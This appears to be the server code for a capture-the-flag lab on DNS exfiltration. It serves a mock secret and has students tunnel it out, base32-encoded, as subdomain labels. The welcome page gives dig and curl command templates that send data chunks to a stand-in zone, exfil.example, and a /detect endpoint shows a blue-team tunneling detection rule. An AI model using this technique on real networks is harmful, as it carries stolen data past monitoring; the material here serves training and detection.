"""DNS exfiltration lab: real UDP DNS receiver + HTTP control plane.

The student grabs /secret over HTTP, encodes it base32, chunks it into
subdomain labels and resolves them against this "authoritative server"
(real UDP 53 inside the container). The server reassembles; a match
unlocks the exfil flag. /detect shows the blue-team view.
"""
import base64
import json
import os
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

F = {i + 1: os.environ.get(f'FLAG_{i + 1}', 'FLAG{p}') for i in range(2)}

SECRET = 'SALES-FY27-INTERNAL-ONLY'
SECRET_B32 = base64.b32encode(SECRET.encode()).decode().rstrip('=').lower()

received = []          # every label seen
collected = {}         # chunk index -> label
EXFIL_OK = threading.Event()


def digest() -> str:
    """Best-effort reassembly: labels ordered by chunk id then first-seen."""
    parts = [v for _, v in sorted(collected.items())]
    return ''.join(parts)


def register_label(label: str, zone_hit: bool) -> None:
    received.append({'label': label, 'len': len(label), 'zone': zone_hit})
    # chunks either carry an explicit index (c<idx>...) or arrive in order
    if label.startswith('c') and label[1:2].isdigit():
        idx = int(label[1]) if label[2:3] != '-' else int(label[1:3].rstrip('-'))
        # format cN-<data>
        data = label.split('-', 1)[1] if '-' in label else ''
        if data:
            collected[idx] = data
    else:
        collected[len(collected) + 1000] = label  # sequence without index
    joined = digest()
    # accept the full secret (any chunking) as success
    for candidate in (joined, joined.replace('-', '')):
        if candidate == SECRET_B32:
            EXFIL_OK.set()


def dns_listener() -> None:
    """Minimal DNS responder: answers A 127.0.0.1 for anything, logs labels."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 53))
    while True:
        data, addr = sock.recvfrom(4096)
        try:
            qname, q_end = parse_qname(data)
            labels = qname.split('.')
            zone = qname.endswith('.exfil.example')
            for lab in labels[:-2] if zone else []:
                register_label(lab, zone)
            # response: echo header + question + A 127.0.0.1
            txid = data[:2]
            flags = b'\x81\x80'
            counts = b'\x00\x01\x00\x01\x00\x00\x00\x00'
            question = data[12:q_end]
            answer = b'\xc0\x0c' + b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + bytes([127, 0, 0, 1])
            sock.sendto(txid + flags + counts + question + answer, addr)
        except Exception:
            continue


def parse_qname(data: bytes):
    p = 12
    labels = []
    while data[p] != 0:
        n = data[p]
        labels.append(data[p + 1:p + 1 + n].decode('latin1'))
        p += 1 + n
    q_end = p + 1 + 4  # qname + qtype + qclass
    return '.'.join(labels), q_end


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        path = parsed.path

        if path == '/':
            self.send_html(WELCOME)
        elif path == '/secret':
            self.send_text(f'classified-blob: {SECRET}\n(instruction: exfiltrate this via DNS)\n')
        elif path == '/resolve':
            q = params.get('q', [''])[0]
            if q:
                zone = q.endswith('.exfil.example')
                for lab in q.split('.')[:-2] if zone else []:
                    register_label(lab, zone)
                self.send_json({'status': 'resolved', 'query': q,
                                'exfil_complete': EXFIL_OK.is_set(),
                                **({'flag': F[1]} if EXFIL_OK.is_set() else {})})
            else:
                self.send_json({'error': 'missing ?q='}, 400)
        elif path == '/status':
            joined = digest()
            self.send_json({
                'labels_received': len(received),
                'reassembled': joined,
                'expected_len': len(SECRET_B32),
                'exfil_complete': EXFIL_OK.is_set(),
                **({'flag': F[1]} if EXFIL_OK.is_set() else {}),
            })
        elif path == '/detect':
            longs = [r for r in received if r['len'] >= 20]
            alerts = []
            if len(longs) >= 2:
                alerts.append({'type': 'DNS_TUNNELING', 'severity': 'CRITICAL',
                               'detail': f'{len(longs)} queries with labels >= 20 chars '
                                         f'under one zone — classic exfil channel'})
            if EXFIL_OK.is_set():
                alerts.append({'type': 'DATA_REASSEMBLED', 'severity': 'CRITICAL',
                               'detail': 'reassembled payload matches a known secret'})
            self.send_json({
                'alerts': alerts,
                'queries': received[-10:],
                'blue_team_flag': F[2] if alerts else None,
                'note': '2+ long-label queries to the same unusual zone trip the rule',
            })
        else:
            self.send_html('<h1>404</h1>', 404)

    def send_json(self, data, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())

    def send_text(self, text, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write(text.encode())

    def send_html(self, html, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, *a):
        pass


WELCOME = """<html><body style="font-family:monospace;padding:40px;background:#0d1117;color:#c9d1d9">
<h1>&#127760; DNS Exfiltration</h1>
<p>Steal <a href="/secret" style="color:#58a6ff">/secret</a> through the DNS channel.</p>
<ol>
<li>GET /secret &mdash; the classified blob</li>
<li>Encode it base32, split into labels &le; 40 chars</li>
<li>Resolve them against this server (zone <code>*.exfil.example</code>):<br>
<code>dig @127.0.0.1 -p 18153 c1-&lt;chunk&gt;.exfil.example</code><br>
or without dig: <code>curl "http://127.0.0.1:18112/resolve?q=c1-&lt;chunk&gt;.exfil.example"</code></li>
<li>Check <a href="/status" style="color:#58a6ff">/status</a> &mdash; when the reassembly matches, you get the flag</li>
<li>Blue team: <a href="/detect" style="color:#58a6ff">/detect</a> &mdash; how the channel looks from the SOC</li>
</ol>
</body></html>"""

if __name__ == '__main__':
    threading.Thread(target=dns_listener, daemon=True).start()
    HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
